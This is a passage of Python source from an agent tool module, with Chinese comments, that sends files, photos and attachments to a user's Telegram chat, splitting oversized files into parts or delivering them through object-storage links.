                    "segment",
                    "-reset_timestamps",
                    "1",
                    "-segment_time",
                    f"{segment_time:.3f}",
                    pattern,
                ],
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=max(120, min(1800, int(duration) + 60)),
                check=False,
            )
        except (ValueError, TypeError):
            continue
        if proc.returncode != 0:
            continue
        raw_parts = [
            os.path.join(attempt_dir, name)
            for name in sorted(os.listdir(attempt_dir))
            if name.startswith(f"{stem}.part") and name.endswith(ext)
        ]
        raw_parts = [path for path in raw_parts if os.path.isfile(path) and os.path.getsize(path) > 0]
        if len(raw_parts) <= 1:
            continue
        if any(os.path.getsize(path) > _TG_DOC_MAX_BYTES for path in raw_parts):
            continue

        total = len(raw_parts)
        renamed: list[tuple[str, str]] = []
        width = max(3, len(str(total)))
        for index, path in enumerate(raw_parts, start=1):
            part_name = f"{stem}.part{index:0{width}d}-of-{total:0{width}d}{ext}"
            new_path = os.path.join(attempt_dir, part_name)
            os.replace(path, new_path)
            renamed.append((new_path, part_name))
        return renamed
    return []


def _split_file_binary_for_telegram(
    *,
    abs_path: str,
    filename: str,
    size: int,
    split_dir: str,
) -> list[tuple[str, str]]:
    part_size = _telegram_split_part_size()
    part_count = int(math.ceil(size / part_size))
    if part_count <= 1:
        return []
    width = max(3, len(str(part_count)))
    parts: list[tuple[str, str]] = []
    with open(abs_path, "rb") as src:
        for part_index in range(1, part_count + 1):
            part_name = f"{filename}.part{part_index:0{width}d}-of-{part_count:0{width}d}"
            part_path = os.path.join(split_dir, part_name)
            remaining = part_size
            with open(part_path, "wb") as dst:
                while remaining > 0:
                    chunk = src.read(min(1024 * 1024, remaining))
                    if not chunk:
                        break
                    dst.write(chunk)
                    remaining -= len(chunk)
            if os.path.getsize(part_path) > 0:
                parts.append((part_path, part_name))
    return parts


def _send_large_file_in_parts(
    *,
    abs_path: str,
    filename: str,
    size: int,
    target: str,
    caption: str,
    token: str | None = None,
):
    """Split an oversized file and send each part as a document.

    Videos are best-effort split into playable segments with ffmpeg. Other
    files fall back to binary parts so Telegram still receives every byte.
    """
    from agent_core.tool_result import ToolResult, ErrorCode

    sent_parts = 0
    part_names: list[str] = []
    estimated_parts = int(math.ceil(size / max(1, _telegram_split_part_size())))
    if estimated_parts > _TG_MAX_SPLIT_PARTS:
        return ToolResult.failure(
            (
                f"檔案需要約 {estimated_parts} 個 Telegram 分卷，超過安全上限 "
                f"{_TG_MAX_SPLIT_PARTS}；為避免長時間上傳卡住，已停止"
            ),
            error_code=ErrorCode.INVALID_INPUT,
            recoverable=False,
            suggested_fix="請壓縮/降低解析度，或在 telegram_only 模式設定 RED_OBJECT_BASE_URL 透過物件連結交付",
        )
    with tempfile.TemporaryDirectory(prefix="red_tg_split_") as split_dir:
        try:
            parts = _try_split_video_for_telegram(
                abs_path=abs_path,
                filename=filename,
                size=size,
                split_dir=split_dir,
            )
            delivery = "video_segments" if parts else "split_documents"
            if not parts:
                parts = _split_file_binary_for_telegram(
                    abs_path=abs_path,
                    filename=filename,
                    size=size,
                    split_dir=split_dir,
                )
            part_count = len(parts)
            if part_count <= 1:
                return ToolResult.failure(
                    f"檔案 {size / 1024 / 1024:.1f}MB 超過 Telegram 單檔上限，但分割未產生有效分卷",
                    error_code=ErrorCode.INTERNAL,
                    recoverable=False,
                    suggested_fix=f"原檔保留在 {abs_path}",
                )
            for part_index, (part_path, part_name) in enumerate(parts, start=1):
                part_names.append(part_name)
                label = "影片分段" if delivery == "video_segments" else "分卷"
                part_caption = (
                    f"{caption}\n\n" if caption and part_index == 1 else ""
                ) + (
                    f"{label} {part_index}/{part_count}: {filename}\n"
                    "單檔超過 Telegram Bot 上限，所以分批回傳。"
                )
                if delivery == "split_documents":
                    part_caption += "\n這是二進位分卷；需要全部分卷才能還原原檔。"
                part_caption = part_caption[:_TG_CAPTION_MAX]
                _result, err, attempts_used = _send_document_part_with_retries(
                    target=target,
                    part_path=part_path,
                    part_name=part_name,
                    caption=part_caption,
                    token=token,
                )
                if err:
                    return ToolResult.failure(
                        (
                            f"大檔分卷傳送失敗：{filename} 第 {part_index}/{part_count} 卷失敗：{err}\n"
                            f"已送出 {sent_parts}/{part_count} 卷；原檔保留在 {abs_path}"
                        ),
                        error_code=ErrorCode.NETWORK,
                        recoverable=True,
                        suggested_fix="網路穩定後可重新傳送，或改用較低解析度下載",
                    )
                sent_parts += 1
                if attempts_used > 1:
                    part_names[-1] = f"{part_name}（第 {attempts_used} 次成功）"
        except Exception as exc:
            return ToolResult.failure(
                f"大檔分割失敗：{type(exc).__name__}: {exc}",
                error_code=ErrorCode.INTERNAL,
                recoverable=False,
                suggested_fix=f"原檔保留在 {abs_path}",
            )

    if sent_parts != part_count:
        return ToolResult.failure(
            f"大檔分割只產生 {sent_parts}/{part_count} 卷，未完整傳送；原檔保留在 {abs_path}",
            error_code=ErrorCode.INTERNAL,
            recoverable=False,
        )

    return ToolResult.success(
        f"✅ {filename} 超過 Telegram 單檔上限，已分成 {part_count} 卷傳送到 Telegram",
        data={
            "filename": filename,
            "size_bytes": size,
            "chat_id": target,
            "delivery": delivery,
            "part_count": part_count,
            "part_size_bytes": _telegram_split_part_size(),
            "parts": part_names,
        },
        artifacts=[abs_path],
    )


def telegram_send_file(file_path: str, caption: str = "",
                        chat_id: str = ""):
    """🟡 把檔案傳到大王 Telegram（用 sendDocument）。

    用 sendDocument — 大王收到後可下載，所有檔案類型通用（PDF / Excel /
    Word / zip / 等）。超過單檔上限時會分卷傳送。圖片想 inline 顯示用
    telegram_send_photo。

    Args:
        file_path: 要傳的檔案絕對或相對路徑
        caption: 隨附文字說明（最多 1024 字）
        chat_id: 留空用大王 keyring 預設

    Returns:
        ToolResult.success/failure — 含 file_size_kb / filename in data
    """
    from agent_core.tool_result import ToolResult, ErrorCode
    ok, err_or_path = _validate_send_path(file_path)
    if not ok:
        return ToolResult.failure(err_or_path,
                                   error_code=ErrorCode.INVALID_INPUT,
                                   recoverable=False)
    abs_path = err_or_path
    target, chat_err = _resolve_chat_id(chat_id)
    if chat_err:
        return ToolResult.failure(chat_err,
                                   error_code=ErrorCode.PERMISSION_DENIED,
                                   recoverable=False)
    # 目標綁部門色且該色 bot 可觸達 → 由部門 bot 上傳（員工可能封鎖主 bot）。
    # 先探測再選 token（_bot_token_for_target），避免大檔上傳失敗才換 bot 重傳。
    token = _bot_token_for_target(target) or None

    # caption 限長 + redact
    caption = (caption or "")[:_TG_CAPTION_MAX]
    try:
        from agent_core.log_redact import redact_log_line
        caption = redact_log_line(caption)
    except Exception:
        pass

    filename = os.path.basename(abs_path)
    size = os.path.getsize(abs_path)
    if size > _TG_DOC_MAX_BYTES:
        telegram_only_mode = False
        try:
            from agent_core.exchange_policy import is_telegram_only_mode
            telegram_only_mode = bool(is_telegram_only_mode())
        except Exception:
            telegram_only_mode = False

        if telegram_only_mode:
            try:
                from agent_core.exchange_policy import stage_artifact_for_exchange
                artifact = stage_artifact_for_exchange(
                    abs_path,
                    purpose="telegram-outgoing",
                )
                if not artifact.public_url:
                    return ToolResult.failure(
                        (
                            f"檔案 {size / 1024 / 1024:.1f}MB 超過 Telegram 50MB 上限，"
                            f"已暫存到 artifact store：{artifact.stored_path}，"
                            "但未設定 RED_OBJECT_BASE_URL，無法透過 Telegram 交付可點連結"
                        ),
                        error_code=ErrorCode.INVALID_INPUT,
                        recoverable=False,
                        suggested_fix=(
                            "設定 RED_OBJECT_BASE_URL 指向物件儲存公開/簽名網址 base，"
                            "或壓縮/切割檔案後重傳"
                        ),
                    )
                text = (
                    f"📦 {filename} ({size / 1024 / 1024:.1f}MB) 超過 Telegram 50MB 上限。\n"
                    "已放到小紅 artifact/object storage，請用這個連結下載：\n"
                    f"{artifact.public_url}"
                )
                if caption:
                    text = f"{caption}\n\n{text}"
                _result, err = _send_message_with_retries(
                    target, text[:_TELEGRAM_MSG_LIMIT], timeout=15, token=token,
                )
                if err:
                    return ToolResult.failure(
                        f"大檔已暫存，但 Telegram 連結訊息傳送失敗：{err}",
                        error_code=ErrorCode.NETWORK,
                        recoverable=True,
                        suggested_fix=f"artifact path: {artifact.stored_path}",
                    )
                return ToolResult.success(
                    f"✅ 已透過 Telegram 傳送大檔連結：{filename}",
                    data={
                        "filename": filename,
                        "size_bytes": size,
                        "chat_id": target,
                        "delivery": "object_link",
                        "url": artifact.public_url,
                        "sha256": artifact.sha256,
                    },
                    artifacts=[abs_path, artifact.stored_path],
                )
            except Exception:
                # Object-store delivery is an optimization for cloud mode. If
                # staging is unavailable, still try Telegram split delivery so
                # the user can receive the file in the chat.
                pass

        return _send_large_file_in_parts(
            abs_path=abs_path,
            filename=filename,
            size=size,
            target=target,
            caption=caption,
            token=token,
        )

    try:
        with open(abs_path, "rb") as f:
            result, err = _telegram_call_multipart(
                "sendDocument",
                files={"document": (filename, f)},
                data={"chat_id": target, "caption": caption},
                token=token,
            )
    except Exception as e:
        return ToolResult.failure(
            f"開檔失敗：{type(e).__name__}: {e}",
            error_code=ErrorCode.INTERNAL, recoverable=False,
        )
    if err:
        return ToolResult.failure(err, error_code=ErrorCode.NETWORK,
                                   recoverable=True)
    return ToolResult.success(
        f"✅ 已傳送 {filename} ({size / 1024:.0f}KB) 到 Telegram",
        data={"filename": filename, "size_bytes": size,
              "chat_id": target},
        artifacts=[abs_path],
    )


def telegram_send_photo(file_path: str, caption: str = "",
                         chat_id: str = ""):
    """🟡 把圖片傳到大王 Telegram（用 sendPhoto，inline 顯示縮圖）。

    限 10 MB 以內 + 圖片格式（jpg/png/gif/webp）。超過或非圖片格式請改
    用 telegram_send_file。

    Args:
        file_path: 圖片路徑
        caption: 圖說（最多 1024 字）
        chat_id: 留空用 keyring 預設

    Returns:
        ToolResult.success/failure
    """
    from agent_core.tool_result import ToolResult, ErrorCode
    abs_path, val_err, suggested_fix = _validate_photo_for_send(file_path)
    if val_err:
        return ToolResult.failure(
            val_err, error_code=ErrorCode.INVALID_INPUT, recoverable=False,
            **({"suggested_fix": suggested_fix} if suggested_fix else {}),
        )
    size = os.path.getsize(abs_path)
    target, chat_err = _resolve_chat_id(chat_id)
    if chat_err:
        return ToolResult.failure(chat_err,
                                   error_code=ErrorCode.PERMISSION_DENIED,
                                   recoverable=False)

    # 目標綁部門色且該色 bot 可觸達 → 由部門 bot 上傳（員工可能封鎖主 bot）。
    token = _bot_token_for_target(target) or None

    caption = (caption or "")[:_TG_CAPTION_MAX]
    try:
        from agent_core.log_redact import redact_log_line
        caption = redact_log_line(caption)
    except Exception:
        pass

    filename = os.path.basename(abs_path)
    try:
        result, err = _send_photo_with_retries(
            target=target, abs_path=abs_path, filename=filename, caption=caption,
            token=token,
        )
    except Exception as e:
        return ToolResult.failure(
            f"開檔失敗：{type(e).__name__}: {e}",
            error_code=ErrorCode.INTERNAL, recoverable=False,
        )
    if err:
        return ToolResult.failure(err, error_code=ErrorCode.NETWORK,
                                   recoverable=True)
    return ToolResult.success(
        f"✅ 已傳送圖片 {filename} ({size / 1024:.0f}KB) 到 Telegram",
        data={"filename": filename, "size_bytes": size,
              "chat_id": target},
        artifacts=[abs_path],
    )


def telegram_send_attachment(file_path: str, caption: str = "",
                              chat_id: str = ""):
    """🟡 智慧路由：副檔名是圖片走 sendPhoto，其他走 sendDocument。

    LLM 不確定要用 photo 還是 file 時呼叫此 — 自動選對的方法。
    圖片超過 10MB 會自動 fall back 到 sendDocument（仍可送但失去 inline 預覽）。

    Args:
        file_path: 任意檔案
        caption: 說明
        chat_id: 預設 keyring chat_id
    """
    from agent_core.tool_result import ToolResult
    if not isinstance(file_path, str) or not file_path:
        return telegram_send_file(file_path, caption, chat_id)
    ext = os.path.splitext(file_path)[1].lower()
    if ext in _TG_PHOTO_EXTS:
        result = telegram_send_photo(file_path, caption, chat_id)
        # 若是圖片但太大 → fall back 到 document
        if isinstance(result, ToolResult) and not result.ok and \
                "10MB 上限" in str(result):
            print(f"[telegram] 圖片 {file_path} 超過 sendPhoto 10MB 上限 — fall back 到 sendDocument")
            return telegram_send_file(file_path, caption, chat_id)
        return result
    return telegram_send_file(file_path, caption, chat_id)
